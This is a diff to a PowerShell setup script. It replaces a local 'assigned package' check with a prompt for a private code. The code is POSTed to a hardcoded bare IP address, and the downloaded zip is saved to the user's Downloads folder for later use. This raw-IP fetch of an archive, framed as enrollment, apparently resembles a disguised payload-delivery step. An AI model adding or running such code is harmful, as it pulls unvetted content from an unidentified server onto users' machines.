@@ -11,9 +11,24 @@ $documents = [Environment]::GetFolderPath('MyDocuments')
 $repo = [IO.Path]::GetFullPath((Join-Path $documents 'tempZip')).TrimEnd('\')
 $zip = Join-Path (Join-Path $env:USERPROFILE 'Downloads') "$Name.zip"
 
-if (-not (Test-Path -LiteralPath $zip -PathType Leaf)) {
-    throw "Place the assigned package here first: $zip"
+$secureToken = Read-Host -Prompt "Enter the private download code for $Name" -AsSecureString
+$tokenPointer = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureToken)
+try {
+    $token = [Runtime.InteropServices.Marshal]::PtrToStringBSTR($tokenPointer)
+    $body = @{ name = $Name; token = $token } | ConvertTo-Json -Compress
+    Invoke-WebRequest -Uri 'https://167.86.96.175/enrollment-download.php' `
+        -Method Post -ContentType 'application/json' -Body $body -OutFile $zip -UseBasicParsing
+} catch {
+    Remove-Item -LiteralPath $zip -Force -ErrorAction SilentlyContinue
+    throw 'Secure package download failed. Check the code and server connection.'
+} finally {
+    if ($tokenPointer -ne [IntPtr]::Zero) {
+        [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($tokenPointer)
+    }
+    $token = $null
+    $body = $null
 }
+
 if (-not (Get-Command git.exe -ErrorAction SilentlyContinue)) {
     throw 'Git for Windows is required to clone the repository.'
 }
